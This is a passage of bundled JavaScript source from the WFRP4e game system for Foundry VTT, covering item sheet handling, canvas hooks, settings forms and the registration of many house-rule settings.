   this.element.find(".close").attr({"data-tooltip" : game.i18n.localize("SHEET.Close"), "data-tooltip-direction" : "UP"});
   this.element.find(".configure-sheet").attr({"data-tooltip" : game.i18n.localize("SHEET.Configure"), "data-tooltip-direction" : "UP"});
   this.element.find(".post").attr({"data-tooltip" : game.i18n.localize("SHEET.Post"), "data-tooltip-direction" : "UP"});
   this.element.find(".import").attr({"data-tooltip" : game.i18n.localize("SHEET.Import"), "data-tooltip-direction" : "UP"});
   let idLink = this.element.find(".document-id-link");
   this.element.find(".window-title").after(idLink);
   WFRP_Utility.addLinkSources(this.element);
  }


  /**
   * Use a type-specific template for each different item type
   */
  get template() {
    let type = this.item.type;
    return `systems/wfrp4e/templates/items/item-${type}-sheet.hbs`;
  }

  /* -------------------------------------------- */

  /**
   * Prepare item sheet data.
   * 
   * Start with the base item data and extending with additional properties for rendering.
   * Each item type has specific data (typically from config constants) that needs to be rendered
   * 
   * Example: A weapon sheet needs all different weapon types to list in the weaponGroup dropdown (`data['weaponGroups'] =  game.wfrp4e.config.weaponGroups;`)
   */
  async getData() {
    const data = await super.getData();
    data.system = data.item._source.system; // Use source data to avoid modifications being applied

    if (this.item.type == "spell") 
    {
      if (game.wfrp4e.config.magicLores[this.item.lore.value]) {
        data["loreValue"] = game.wfrp4e.config.magicLores[this.item.lore.value];
      }
      else {
        data["loreValue"] = this.item.lore.value;
      }
    }

    //@HOUSE
    if (this.item.type == "weapon" && game.settings.get("wfrp4e", "mooRangeBands"))
    {
      game.wfrp4e.utility.logHomebrew("mooRangeBands");
      data.showOptimal = true;
    }
    //@/HOUSE

    else if (this.item.type == "career") {
      data['skills'] = this.item.system.skills.join(", ").toString();
      data['earningSkills'] = this.item.system.incomeSkill.map(skillIndex => this.item.system.skills[skillIndex]);
      data['talents'] = this.item.system.talents.toString();
      data['trappings'] = this.item.system.trappings.toString();
      let characteristicList = foundry.utils.duplicate(game.wfrp4e.config.characteristicsAbbrev);
      for (let char in characteristicList) {
        if (this.item.system.characteristics.includes(char))
          characteristicList[char] = {
            abrev: game.wfrp4e.config.characteristicsAbbrev[char],
            checked: true
          };
        else
          characteristicList[char] = {
            abrev: game.wfrp4e.config.characteristicsAbbrev[char],
            checked: false
          };
      }
      data['characteristicList'] = characteristicList;
    }

    else if (this.item.type == "cargo") {
      data.cargoTypes = game.wfrp4e.trade.tradeData[this.item.system.tradeType || "river"].cargoTypes;
      data.qualities = game.wfrp4e.config.trade.qualities;
      data["dotrActive"] = (game.modules.get("wfrp4e-dotr") && game.modules.get("wfrp4e-dotr").active);
    }

    if (this.item.type == "critical" || this.item.type == "injury" || this.item.type == "disease" || this.item.type == "mutation")
      this.addConditionData(data);
    data.showBorder = data.item.img == "systems/wfrp4e/icons/blank.png" || !data.item.img;
    data.isOwned = this.item.isOwned;
    data.effects = this._handleEffects();
    data.enrichment = await this._handleEnrichment();
    data.fromEffect = this.item.fromEffect;
    return data;
  }

  async _handleEnrichment()
  {
    let enrichment = {};
    enrichment["system.description.value"] = await TextEditor.enrichHTML(this.item.system.description.value, { async: true, secrets: this.item.isOwner, relativeTo: this.item});
    enrichment["system.gmdescription.value"] = await TextEditor.enrichHTML(this.item.system.gmdescription.value, { async: true, secrets: this.item.isOwner, relativeTo: this.item });

    return foundry.utils.expandObject(enrichment)
  }

  _handleEffects()
  {
    let effects = {};

    effects.active = this.item.effects.contents.filter(i => i.active);
    effects.disabled = this.item.effects.contents.filter(i => i.disabled);
    effects.temporary = this.item.actor?.getEffectsApplyingToItem(this.item) || [];

    return effects;
  }

  addConditionData(data) {
    data.conditions = foundry.utils.duplicate(game.wfrp4e.config.statusEffects).filter(i => !["fear", "grappling", "engaged"].includes(i.id)).map(e => new EffectWfrp4e(e));
    delete data.conditions.splice(data.conditions.length - 1, 1);
    for (let condition of data.conditions) {
      let existing = this.item.effects.find(e => e.conditionId == condition.conditionId);
      if (existing) {
        condition.value = existing.flags.wfrp4e.value;
        condition.flags.wfrp4e.value = existing.conditionValue;
      }
      else if (condition.isNumberedCondition) {
        condition.flags.wfrp4e.value = 0;
      }

      if (condition.flags.wfrp4e.value == null)
        condition.boolean = true;

    }
  }

    /** @inheritdoc */
    _onDragStart(event) {
      // Create drag data
      let dragData;

      let li = event.currentTarget;
      if ( li.dataset.effectId ) {
        const effect = this.item.effects.get(li.dataset.effectId);
        dragData = effect.toDragData();
      }
      if ( !dragData ) return;

      // Set data transfer
      event.dataTransfer.setData("text/plain", JSON.stringify(dragData));
    }

    async _onDrop(event)
    {
      let data = JSON.parse(event.dataTransfer.getData("text/plain"));
      if (data.type == "ActiveEffect")
      {
        const effect = await ActiveEffect.implementation.fromDropData(data);
        if ( !this.item.isOwner || !effect ) 
        {
          return false
        }        if ( this.item.uuid === effect.parent?.uuid ) 
        {
          return false;
        }
        return ActiveEffect.create(effect.toObject(), {parent: this.item});
      }

    }

  /* -------------------------------------------- */

  /**
   * Activate event listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    html.find('input[type="checkbox"]').change(event => this._onSubmit(event));
    html.find('.lore-input').change(this._onLoreChange.bind(this));
    html.find('.char-checkbox').click(this._onCharCheckboxClick.bind(this));
    html.find(".item-checkbox").click(this._onCheckboxClick.bind(this));
    html.find('.csv-input').change(this._onCSVInput.bind(this));
    html.find('.symptom-input').change(this._onSymptomChange.bind(this));
    html.find('.effect-create').click(this._onEffectCreate.bind(this));
    html.find('.effect-title').click(this._onEffectTitleClick.bind(this));
    html.find('.effect-delete').click(this._onEffectDelete.bind(this));
    html.find('.effect-toggle').click(this._onEffectToggle.bind(this));
    html.find(".condition-value").mousedown(this._onConditionClick.bind(this));
    html.find(".condition-toggle").mousedown(this._onConditionToggle.bind(this));
    html.find(".header-link a").mousedown(this._onClickHeaderLink.bind(this));


    html.find(".edit-item-properties").click(ev => {
      new game.wfrp4e.apps.ItemProperties(this.item).render(true);
    });
    html.find(".cargo-sell").click(ev => {
      game.wfrp4e.trade.attemptSell(this.item);
    });

    // Support custom entity links
    html.on("click", ".chat-roll", WFRP_Utility.handleRollClick.bind(WFRP_Utility));
    html.on("click", ".symptom-tag", WFRP_Utility.handleSymptomClick.bind(WFRP_Utility));
    html.on("click", ".condition-chat", WFRP_Utility.handleConditionClick.bind(WFRP_Utility));
    html.on("click", ".property-chat", WFRP_Utility.handlePropertyClick.bind(WFRP_Utility));
    html.on('mousedown', '.table-click', WFRP_Utility.handleTableClick.bind(WFRP_Utility));
    html.on('mousedown', '.pay-link', WFRP_Utility.handlePayClick.bind(WFRP_Utility));
    html.on('mousedown', '.credit-link', WFRP_Utility.handleCreditClick.bind(WFRP_Utility));
    html.on('mousedown', '.corruption-link', WFRP_Utility.handleCorruptionClick.bind(WFRP_Utility));
    html.on('mousedown', '.fear-link', WFRP_Utility.handleFearClick.bind(WFRP_Utility));
    html.on('mousedown', '.terror-link', WFRP_Utility.handleTerrorClick.bind(WFRP_Utility));
    html.on('mousedown', '.exp-link', WFRP_Utility.handleExpClick.bind(WFRP_Utility));

  }

  // Lore input is tricky because we need to choose from a set of defined choices, but it isn't a dropdown
  async _onLoreChange(event) {
    let inputLore = event.target.value;
    // Go through each lore name
    for (let lore in game.wfrp4e.config.magicLores) {
      // If lore value matches config, use that (Update the actor with the "key" value)
      if (inputLore == game.wfrp4e.config.magicLores[lore]) {
        return this.item.update({ 'system.lore.value': lore });
      }
    }
    // Otherwise, if the input isn't recognized, store user input directly as a custom lore
    return this.item.update({ 'system.lore.value': inputLore });
  }


  // For a career, when characteristic checkbox is changed, ensure list of
  // characteristics for that career remains valid.
  _onCharCheckboxClick(event) {
    this._onSubmit(event);
    let charChanged = $(event.currentTarget).attr("name");

    let characteristicList = foundry.utils.duplicate(this.item.characteristics);

    // If the charChanged is already in the list, remove it
    if (characteristicList.includes(charChanged))
      characteristicList.splice(characteristicList.findIndex(c => c == charChanged));
    else // If it isn't in the list, add it
      characteristicList.push(charChanged);

    this.item.update({ 'system.characteristics': characteristicList });
  }

  _onCheckboxClick(event) {
    let target = $(event.currentTarget).attr("data-target");
    this.item.update({[target] : !getProperty(this.item, target)});
  }

  // This listener converts comma separated lists in the career section to arrays,
  // placing them in the correct location using update
  async _onCSVInput(event) {
    this._onSubmit(event);
    let list = event.target.value.split(",").map(function (item) {
      return item.trim();
    });

    switch (event.target.attributes["data-dest"].value) {
      case 'skills':
        {
          await this.item.update({ 'system.skills': list });
        }
        break;

      // find the indices of the skills that match the earning skill input, send those
      // values to data.incomeSkill
      case 'earning':
        {
          this.item.update({ 'system.incomeSkill': [] });
          let earningSkills = [];
          for (let sk in list) {
            let skillIndex = this.item.skills.indexOf(list[Number(sk)]);

            if (skillIndex == -1)
              continue;
            else
              earningSkills.push(skillIndex);

          }
          await this.item.update({ 'system.incomeSkill': earningSkills });
        }
        break;
      case 'talents':
        {
          await this.item.update({ 'system.talents': list });
        }
        break;

      case 'trappings':
        {
          await this.item.update({ 'system.trappings': list });
        }
        break;

    }
  }

  async _onSymptomChange(event) {
    // Alright get ready for some shit

    // Get all symptoms user inputted
    let symptoms = event.target.value.split(",").map(i => i.trim());

    // Extract just the name (with no severity)
    let symtomNames = symptoms.map(s => {
      if (s.includes("("))
        return s.substring(0, s.indexOf("(") - 1)
      else return s
    });

    // take those names and lookup the associated symptom key
    let symptomKeys = symtomNames.map(s => game.wfrp4e.utility.findKey(s, game.wfrp4e.config.symptoms));

    // Remove anything not found
    symptomKeys = symptomKeys.filter(s => !!s);

    // Map those symptom keys into effects, renaming the effects to the user input
    let symptomEffects = symptomKeys.map((s, i) => {
      if (game.wfrp4e.config.symptomEffects[s]) {
        let effect = foundry.utils.duplicate(game.wfrp4e.config.symptomEffects[s]);
        effect.name = symptoms[i];
        return effect

      }
    }).filter(i => !!i);

    // Remove all previous symptoms from the item
    let effects = this.item.effects.map(i => i.toObject()).filter(e => foundry.utils.getProperty(e, "flags.wfrp4e.symptom"));

    // Delete previous symptoms
    await this.item.deleteEmbeddedDocuments("ActiveEffect", effects.map(i => i._id));

    // Add symptoms from input
    await this.item.createEmbeddedDocuments("ActiveEffect", symptomEffects);

    this.item.update({ "system.symptoms.value": symptoms.join(", ") });
  } 
  
  _onEffectTitleClick(ev) {
    let id = this._getId(ev);
    let effect = this.item.effects.get(id);
    effect.sheet.render(true);
  }

  _onEffectDelete(ev) {
    let id = this._getId(ev);
    this.item.deleteEmbeddedDocuments("ActiveEffect", [id]);
  }

  _onEffectToggle(ev) {
    let id = this._getId(ev);
    let effect = this.item.effects.get(id);
    effect.update({disabled : !effect.disabled});
  }

  _onConditionClick(ev) {
    let condKey = $(ev.currentTarget).parents(".sheet-condition").attr("data-cond-id");
    if (ev.button == 0)
      this.item.addCondition(condKey);
    else if (ev.button == 2)
      this.item.removeCondition(condKey);
  }

  _onConditionToggle(ev) {
    let condKey = $(ev.currentTarget).parents(".sheet-condition").attr("data-cond-id");

    if (game.wfrp4e.config.statusEffects.find(e => e.id == condKey).flags.wfrp4e.value == null) {
      if (this.item.hasCondition(condKey))
        this.item.removeCondition(condKey);
      else
        this.item.addCondition(condKey);
      return
    }

    if (ev.button == 0)
      this.item.addCondition(condKey);
    else if (ev.button == 2)
      this.item.removeCondition(condKey);
  }
      
  _onScriptConfig(ev)
  {
      new ScriptConfig(this.object, {path : this._getPath(ev)}).render(true);
  }

  async _onClickHeaderLink(ev)
  {
    let uuid = ev.currentTarget.dataset.uuid;

    let document = await fromUuid(uuid);
    document?.sheet?.render(true);
  }

}

function passengerRender(token) {
    if (!token.document?.flags.wfrp4e?.hidePassengers && token.actor && token.actor.type == "vehicle")
    {
      if (token.passengers)
      {
        token.passengers.destroy();
      }
      let passengerIconSize = canvas.dimensions.size / 3.3333;
      let rowSize = 3;
      let colSize = 3;
      let container = new PIXI.Container();
      let imgCount = 0;
      if (token.actor.system.passengers.list.length > 9)
      {
        passengerIconSize = canvas.dimensions.size / 4;
        rowSize = 4;
        colSize = 4;
      }
      passengerIconSize *= token.document.width;
      for (let img of token.actor.system.passengers.list.map(p => p.img))
      {
        if (!img)
        continue
        let sp = PIXI.Sprite.from(img);
        sp.width = passengerIconSize;
        sp.height = passengerIconSize;
        sp.x = passengerIconSize * (imgCount % rowSize);
        sp.y = passengerIconSize * Math.floor(imgCount / colSize);
        container.addChild(sp);
        imgCount++;
        if (imgCount > 9)
        break;
        token.passengers = token.addChild(container);
      }
    }
}

class WFRPTokenHUD extends TokenHUD {


    activateListeners(html)
    {

        html.find(".status-effects")
        .off("click", ".effect-control", this._onToggleEffect.bind(this))
        .off("contextmenu", ".effect-control", event => this._onToggleEffect(event, {overlay: true}));

    }
}

function canvas$1() {
  Hooks.on("canvasInit", (canvas) => {

    /**
     * Double every other diagonal movement
     */
    SquareGrid.prototype.measureDistances = function (segments, options = {}) {
      if (!options.gridSpaces) return BaseGrid.prototype.measureDistances(segments, options);

      // Track the total number of diagonals
      let nDiagonal = 0;
      this.parent.diagonalRule;
      const d = canvas.dimensions;

      // Iterate over measured segments
      return segments.map(s => {
        let r = s.ray;

        // Determine the total distance traveled
        let nx = Math.abs(Math.ceil(r.dx / d.size));
        let ny = Math.abs(Math.ceil(r.dy / d.size));

        // Determine the number of straight and diagonal moves
        let nd = Math.min(nx, ny);
        let ns = Math.abs(ny - nx);
        nDiagonal += nd;
        let nd10 = Math.floor(nDiagonal / 2) - Math.floor((nDiagonal - nd) / 2);
        let spaces = (nd10 * 2) + (nd - nd10) + ns;
        return spaces * canvas.dimensions.distance;

      });
    };
  });


  Hooks.on("canvasReady", (canvas) => {

    if (!(game.modules.get("fxmaster") && game.modules.get("fxmaster").active)) {
      let morrsliebActive = canvas.scene.getFlag("wfrp4e", "morrslieb");
      if (morrsliebActive) {
        if (!canvas.primary.filters)
          canvas.primary.filters = [];
        canvas.primary.filters.push(CONFIG.Morrslieb);
      } 
      else if (canvas.primary.filters?.length)
      {
        // If morrslieb is not active, remove any morrslieb filters
        canvas.primary.filters = canvas.primary.filters.filter(i => !i.morrslieb);
      }
    }

    canvas.tokens.placeables.forEach(t => t.renderAuras());
    //canvas.hud.token = new WFRPTokenHUD();
  });
}

function controlButtons() {
  /**
   * Add Status right click option for combat tracker combatants
   */
  Hooks.on("getSceneControlButtons", (buttons) => {
    if (!game.canvas || !game.canvas.scene)
      return
    let group = buttons.find(b => b.name == "lighting");
    group.tools.push({
      button: true,
      icon: "fas fa-circle",
      name: "morrslieb",
      title: game.canvas.scene.getFlag("wfrp4e", "morrslieb") ? "Morrslieb - Currently On " : "Morrslieb - Currently Off",
      onClick: WFRP_Utility.toggleMorrslieb
    });
  });
}

function keepId() {

  Hooks.on("preCreateScene", keepId);
  Hooks.on("preCreateJournalEntry", keepId);
  Hooks.on("preCreateRollTable", keepId);



  function keepId(document, data, options) {
    if (data._id)
      options.keepId = WFRP_Utility._keepID(data._id, document);
  }
}

function settings() {
    Hooks.on("updateSetting", (setting) => {


        // Centralized handling of group advantage updates
        // If group advantage is updated, update advantage of all combatants in the current combat
        // Then, make sure that change is reflected in the counter on the combat tracker (if the update was made by a different user)
        if (setting.key == "wfrp4e.groupAdvantageValues")
        {
            ui.notifications.notify(game.i18n.format("GroupAdvantageUpdated", {players : setting.value.players, enemies : setting.value.enemies}));

            if (game.user.isGM && game.combat)
            {
                // This sorta sucks because there isn't a way to update both actors and synthetic actors in one call
                game.combat.combatants.forEach(c => {
                    if (c.actor.status.advantage.value != setting.value[c.actor.advantageGroup])
                        c.actor.update({"system.status.advantage.value" : setting.value[c.actor.advantageGroup]}, {fromGroupAdvantage : true});
                });
            }
            // Update counter values, can't just use ui.combat because there might be popped out combat trackers
            [ui.combat].concat(Object.values(ui.windows).filter(w => w instanceof CombatTracker)).forEach(tracker => {
                tracker.element.find(".advantage-group input").each((index, input) => {
                    let group = input.dataset.group;
                    input.value = setting.value[group];
                });
            });
        }
        
    });

  
}

function notes () {
    Hooks.on("activateNote", (note, options) => {
        options.anchor = note.document.flags.anchor?.slug;
    });
}

function i18n () {
    Hooks.on("i18nInit", () => {
        // Localize strings in the  game.wfrp4e.config.object
        for (let obj of game.wfrp4e.config.toTranslate) {
                for (let el in game.wfrp4e.config[obj]) {
                    if (typeof game.wfrp4e.config[obj][el] === "string") {
                        game.wfrp4e.config[obj][el] = game.i18n.localize(game.wfrp4e.config[obj][el]);
                    }
                }
        }

        // System items are created localized, so must be created here
        game.wfrp4e.config.PrepareSystemItems();
    });
}

class HomebrewSettings extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "homebrew-settings";
        options.template = "systems/wfrp4e/templates/apps/homebrew-settings.hbs";
        options.width = 600;
        options.minimizable = true;
        options.resizable = true;
        options.title = "Homebrew Settings";
        return options;
    }

    getData() {
        let data = super.getData();

        data.settings = Array.from(game.settings.settings).filter(s => s[1].homebrew).map(i => i[1]);
        data.settings = data.settings.filter(s => !s.key.includes("moo"));
        data.mooSettings = Array.from(game.settings.settings).filter(s => s[1].homebrew).map(i => i[1]).filter(s => s.key.includes("moo"));

        data.settings.forEach(s => s.inputType = s.type == Boolean ? "checkbox" : "text");
        data.mooSettings.forEach(s => s.inputType = s.type == Boolean ? "checkbox" : "text");

        data.settings.forEach(s => s.value = game.settings.get(s.namespace, s.key));
        data.mooSettings.forEach(s => s.value = game.settings.get(s.namespace, s.key));
        return data
    }


    async _updateObject(event, formData) {
        for(let setting in formData)
            game.settings.set("wfrp4e", setting, formData[setting]);
    }

  

}

class TableSettings extends FormApplication {
    static get defaultOptions() {
        const options = super.defaultOptions;
        options.id = "table-settings";
        options.template = "systems/wfrp4e/templates/apps/table-settings.hbs";
        options.width = 600;
        options.minimizable = true;
        options.resizable = true;
        options.title = "Table Settings";
        return options;
    }

    getData() {
        let data = super.getData();
        let settings = game.settings.get("wfrp4e", "tableSettings");
        data.settings = {};

        for (let setting in settings)
        {
            data.settings[setting] = {
                label : "SETTINGS.TABLE_" + setting,
                choices : this.getTableChoices(setting),
                selected : settings[setting]
            };
        }

        return data
    }

    getTableChoices(key)
    {
        let choices = {};
        let tables = game.tables.filter(i => i.getFlag("wfrp4e", "key") == key);


        // Add tables without a column 
        for(let t of tables.filter(i => !i.getFlag("wfrp4e", "column")))
        {
            choices[t.id] = t.name;
        }

        let columns = tables.filter(i => i.getFlag("wfrp4e", "column"));
        if (columns.length)
        {
            choices[columns.map(i => i.id).join(",")] = columns[0].name.split("-")[0];
        }
        return choices
    }


    async _updateObject(event, formData) {
        return game.settings.set("wfrp4e", "tableSettings", formData)
    }

  

}

let debounceReload = foundry.utils.debounce(() => {
  window.location.reload();
}, 100);

function init() {
  /**
   * Init function loads tables, registers settings, and loads templates
   */
  Hooks.once("init", () => {

    TravelDistanceWfrp4e.loadTravelData();

    game.settings.register("wfrp4e", "systemMigrationVersion", {
      name: "System Migration Version",
      scope: "world",
      config: false,
      type: String,
      default: 0
    });

    game.settings.registerMenu("wfrp4e", "homebrew", {
      name: "WFRP4e House Rules",
      label: "WFRP4e Homebrew",
      hint: "Settings for common homebrew/house rules",
      type: HomebrewSettings,
      restricted: true
  });

  game.settings.registerMenu("wfrp4e", "tableSettings", {
    name: "WFRP4e Table Settings",
    label: "WFRP4e Table Settings",
    hint: "Configure which tables to roll on when multiple of the same key exist.",
    type: TableSettings,
    restricted: true
});

    // Register initiative rule
    game.settings.register("wfrp4e", "initiativeRule", {
      name: "SETTINGS.InitRule",
      hint: "SETTINGS.InitHint",
      scope: "world",
      config: true,
      default: "default",
      type: String,
      choices: {
        "default": "SETTINGS.InitDefault",
        "sl": "SETTINGS.InitSL",
        "d10Init": "SETTINGS.InitD10",
        "d10InitAgi": "SETTINGS.InitD10Agi"
      },
      onChange: rule => _setWfrp4eInitiative(rule)
    });
    _setWfrp4eInitiative(game.settings.get("wfrp4e", "initiativeRule"));


    function _setWfrp4eInitiative(initMethod) {
      let formula;
      switch (initMethod) {
        case "default":
          formula = "@characteristics.i.value + @characteristics.ag.value/100";
          break;

        case "sl":
          formula = "(floor(@characteristics.i.value / 10) - floor(1d100/10))";
          break;

        case "d10Init":
          formula = "1d10 + @characteristics.i.value";
          break;

        case "d10InitAgi":
          formula = "1d10 + @characteristics.i.bonus + @characteristics.ag.bonus";
          break;
      }

      let decimals = (initMethod == "default") ? 2 : 0;
      CONFIG.Combat.initiative = {
        formula: formula,
        decimals: decimals
      };
    }

    // Register Advantage Cap
    game.settings.register("wfrp4e", "advantagemax", {
      name: "SETTINGS.AdvantageMax",
      hint: "SETTINGS.AdvantageMaxHint",
      scope: "world",
      config: true,
      default: 10,
      type: Number
    });

    // Register Advantage cap
    game.settings.register("wfrp4e", "capAdvantageIB", {
      name: "SETTINGS.CapAdvIB",
      hint: "SETTINGS.CapAdvIBHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    // Register Automatic Success threshold
    game.settings.register("wfrp4e", "automaticSuccess", {
      name: "SETTINGS.AutomaticSuccess",
      hint: "SETTINGS.AutomaticSuccessHint",
      scope: "world",
      config: true,
      default: 5,
      type: Number
    });

    // Register Automatic Success threshold
    game.settings.register("wfrp4e", "automaticFailure", {
      name: "SETTINGS.AutomaticFailure",
      hint: "SETTINGS.AutomaticFailureHint",
      scope: "world",
      config: true,
      default: 96,
      type: Number
    });

    // Register Fast SL rule
    game.settings.register("wfrp4e", "fastSL", {
      name: "SETTINGS.FastSL",
      hint: "SETTINGS.FastSLHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    // Register Tests above 100% Rule
    game.settings.register("wfrp4e", "testAbove100", {
      name: "SETTINGS.TestsAbove100",
      hint: "SETTINGS.TestsAbove100Hint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    // Register Criticals/Fumbles on all tests
    game.settings.register("wfrp4e", "criticalsFumblesOnAllTests", {
      name: "SETTINGS.CriticalsFumblesAllTests",
      hint: "SETTINGS.CriticalsFumblesAllTestsHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });


    // Register Extended Tests
    game.settings.register("wfrp4e", "extendedTests", {
      name: "SETTINGS.ExtendedTests",
      hint: "SETTINGS.ExtendedTestsHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "channelingNegativeSLTests", {
      name: "SETTINGS.ChannelingNegativeSL",
      hint: "SETTINGS.ChannelingNegativeSLHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    // Limit Equipped Items
    game.settings.register("wfrp4e", "limitEquippedWeapons", {
      name: "SETTINGS.LimitEquippedWeapons",
      hint: "SETTINGS.LimitEquippedWeaponsHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    // Register Test auto-fill
    game.settings.register("wfrp4e", "autoFillAdvantage", {
      name: "SETTINGS.AutoFillAdv",
      hint: "SETTINGS.AutoFillAdvHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    // Register default test difficulty
    game.settings.register("wfrp4e", "testDefaultDifficulty", {
      name: "SETTINGS.TestDialogDefaultDifficulty",
      hint: "SETTINGS.TestDialogDefaultDifficultyHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    // Register Round Summary
    game.settings.register("wfrp4e", "displayRoundSummary", {
      name: "SETTINGS.RoundSummary",
      hint: "SETTINGS.RoundSummaryHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    // Register Status on Turn Start
    game.settings.register("wfrp4e", "statusOnTurnStart", {
      name: "SETTINGS.StatusTurnStart",
      hint: "SETTINGS.StatusTurnStartHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });


    // Register Focus on Turn Start
    game.settings.register("wfrp4e", "focusOnTurnStart", {
      name: "SETTINGS.FocusTurnStart",
      hint: "SETTINGS.FocusTurnStartHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    // Register Hiding Test Data
    game.settings.register("wfrp4e", "hideTestData", {
      name: "SETTINGS.HideTestData",
      hint: "SETTINGS.HideTestDataHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    // Register Manual Chat Cards
    game.settings.register("wfrp4e", "manualChatCards", {
      name: "SETTINGS.ManualChatCards",
      hint: "SETTINGS.ManualChatCardsHint",
      scope: "client",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "weaponLength", {
      name: "SETTINGS.WeaponLength",
      hint: "SETTINGS.WeaponLengthHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    game.settings.register("wfrp4e", "rangeAutoCalculation", {
      name: "SETTINGS.RangeAutoCalculation",
      hint: "SETTINGS.RangeAutoCalculationHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });


    game.settings.register("wfrp4e", "playerBrowser", {
      name: "SETTINGS.PlayerBrowser",
      hint: "SETTINGS.PlayerBrowserHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "playerExperienceEditing", {
      name: "SETTINGS.PlayerExperienceEditing",
      hint: "SETTINGS.PlayerExperienceEditingHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });


    // Register Advantage cap
    game.settings.register("wfrp4e", "soundPath", {
      name: "SETTINGS.SoundEffects",
      hint: "SETTINGS.SoundEffectsHint",
      scope: "world",
      config: true,
      default: "systems/wfrp4e/sounds/",
      type: String
    });

    game.settings.register("wfrp4e", "customCursor", {
      name: "SETTINGS.CustomCursor",
      hint: "SETTINGS.CustomCursorHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });


    game.settings.register("wfrp4e", "throwMoney", {
      name: "SETTINGS.ThrowMoney",
      hint: "SETTINGS.ThrowMoneyHint",
      scope: "world",
      config: true,
      default: true,
      type: Boolean
    });

    game.settings.register("wfrp4e", "advantageBonus", {
      name: "SETTINGS.AdvantageBonus",
      hint: "SETTINGS.AdvantageBonusHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: 10,
      type: Number
    });

    game.settings.register("wfrp4e", "uiaCrits", {
      name: "SETTINGS.UIACrits",
      hint: "SETTINGS.UIACritsHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "uiaCritsMod", {
      name: "SETTINGS.UIACritsMod",
      hint: "SETTINGS.UIACritsModHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: 10,
      type: Number
    });

    game.settings.register("wfrp4e", "uiaShields", {
      name: "SETTINGS.UIAShields",
      hint: "SETTINGS.UIAShieldsHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "tables", {
      scope: "world",
      config: false,
      default: {},
      type: Object
    });

    game.settings.register("wfrp4e", "bugReportName", {
      scope: "world",
      config: false,
      default: "",
      type: String
    });

    game.settings.register("wfrp4e", "tableVisibility", {
      scope: "world",
      config: false,
      default: {},
      type: Object
    });

    
    game.settings.register("wfrp4e", "tableRollMode", {
      scope: "client",
      config: false,
      default: {},
      type: Object
    });

    game.settings.register("wfrp4e", "useGroupAdvantage", {
      name: "SETTINGS.UseGroupAdvantage",
      hint: "SETTINGS.UseGroupAdvantageHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean, 
      onChange: debounceReload,
    });

    game.settings.register("wfrp4e", "groupAdvantageValues", {
      scope: "world",
      config: false,
      default: {players: 0, enemies : 0},
      type: Object
    });

    game.settings.register("wfrp4e", "mooAdvantage", {
      name: "SETTINGS.MooAdvantage",
      hint: "SETTINGS.MooAdvantageHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });



    game.settings.register("wfrp4e", "mooDifficulty", {
      name: "SETTINGS.MooDifficulty",
      hint: "SETTINGS.MooDifficultyHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });


    
    // game.settings.register("wfrp4e", "mooCritsFumbles", {
    //   name: "SETTINGS.MooCritsFumbles",
    //   hint: "SETTINGS.MooCritsFumblesHint",
    //   scope: "world",
    //   config: false,
    //   homebrew: true,
    //   default: false,
    //   type: Boolean
    // });


    game.settings.register("wfrp4e", "mooConditions", {
      name: "SETTINGS.MooConditions",
      hint: "SETTINGS.MooConditionsHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooConditionTriggers", {
      name: "SETTINGS.MooConditionTriggers",
      hint: "SETTINGS.MooConditionTriggersHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooCritModifiers", {
      name: "SETTINGS.MooCritModifiers",
      hint: "SETTINGS.MooCritMOdifiersHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });


    game.settings.register("wfrp4e", "mooSLDamage", {
      name: "SETTINGS.MooSLDamage",
      hint: "SETTINGS.MooSLDamageHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooRangedDamage", {
      name: "SETTINGS.MooRangedDamage",
      hint: "SETTINGS.MooRangedDamageHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });


    game.settings.register("wfrp4e", "mooMagicAdvantage", {
      name: "SETTINGS.MooMagicAdvantage",
      hint: "SETTINGS.MooMagicAdvantageHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooOvercasting", {
      name: "SETTINGS.MooOvercasting",
      hint: "SETTINGS.MooOvercastingHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooCatastrophicMiscasts", {
